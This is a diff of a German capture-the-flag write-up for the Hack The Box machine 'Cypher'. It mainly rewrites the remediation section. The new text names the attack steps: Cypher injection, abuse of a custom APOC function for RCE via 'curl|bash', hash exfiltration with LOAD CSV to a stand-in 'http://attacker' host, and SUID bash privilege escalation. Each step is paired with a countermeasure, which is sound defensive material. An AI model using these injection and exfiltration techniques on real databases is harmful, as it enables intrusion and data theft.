@@ -1,7 +1,5 @@
 # Maschine 2: Cypher
 
-
-
 ## 1. Netzwerkanbindung
 
 Wie immer starten wir mit der Verbindung zum HTB‑Netzwerk via OpenVPN:
@@ -189,19 +187,51 @@ cat /root/root.txt
 
 ![1746479136549](image/Cypher/1746479136549.png)
 
-![alt text](<Screenshot 2025-05-05 at 15-53-50 Hack The Box Hack The Box.png>)
+![alt text](Screenshot 2025-05-05 at 15-53-50 Hack The Box Hack The Box.png)
 
 HTB‑Link: [https://www.hackthebox.com/achievement/machine/2350832/650](https://www.hackthebox.com/achievement/machine/2350832/650)
 
----
 
-## 8. Empfehlungen
+## Empfehlungen & Geeignete Gegenmassnahmen
 
-1. Keine String-Konkatenation bei Cypher-Queries → **Parametrisieren!**
-2. **APOC-Module** wie `getUrlStatusCode` nur bei echtem Bedarf aktivieren.
-3. **SUID-Binaries** vermeiden oder hart absichern.
-4. Passwörter niemals in Klartext in `.yml`-Dateien speichern.
+1.**Cypher-Injection absichern**
 
----
+- Die Applikation war verwundbar gegenüber Cypher-Injection durch direkte String-Konkatenation in Neo4j-Abfragen.
 
-✅ **HTB Cypher vollständig owned.**
+   → **Massnahme:** Nutzung von **parametrisierten Cypher-Queries**, z. B. mit `$parameter`-Syntax, um direkte Injektionen zu verhindern.
+
+2.**APOC-Plugins wie getUrlStatusCode beschränken**
+
+- Die Funktion `custom.getUrlStatusCode()` wurde missbraucht, um RCE über `curl|bash` zu erzielen.
+
+   → **Massnahme:** Deaktivieren oder hart absichern aller **unsicheren APOC-Prozeduren**, z. B. durch Whitelisting in der Konfiguration.
+
+3.**Exfiltration über LOAD CSV verhindern**
+
+- Durch `LOAD CSV FROM 'http://attacker'` konnte ein Hash exfiltriert werden.
+
+   → **Massnahme:** Ausgehenden Netzwerkverkehr der Datenbank einschränken, insbesondere HTTP-Zugriffe durch Neo4j.
+
+4.**Zugangsdaten nicht im Klartext speichern**
+
+- Ein Passwort wurde im Klartext in `bbot_preset.yml` gefunden.
+
+   → **Massnahme:** Konfigurationsdateien niemals für Klartext-Passwörter verwenden, sondern Umgebungsvariablen oder sichere Vaults.
+
+5.**SUID-Binaries prüfen**
+
+- SUID-Bash ermöglichte eine einfache Privilege Escalation.
+
+   → **Massnahme:** Regelmässiger Audit aller SUID/SGID-Binaries mit Tools wie `find / -perm -4000 -type f -exec ls -la {} \;`
+
+6.**Minimalprinzip für Benutzerrechte**
+
+- Der Benutzer `neo4j` hatte Zugriff auf sensible Dateien und konnte durch Injektion Systemkommandos ausführen.
+
+   → **Massnahme:** Rechte der Datenbankbenutzer auf das absolute Minimum reduzieren, insbesondere bei selbstgebauten Plugins oder Extensions.
+
+7.**Logging und Monitoring**
+
+- Es gab keinerlei Hinweis auf Überwachung oder Alarme bei ungewöhnlichem Verhalten (z. B. externer HTTP-Zugriff durch DB).
+
+   → **Massnahme:** Integration von SIEM, File Integrity Monitoring und Alerting bei Anomalien im Datenbank- oder Web-Stack.
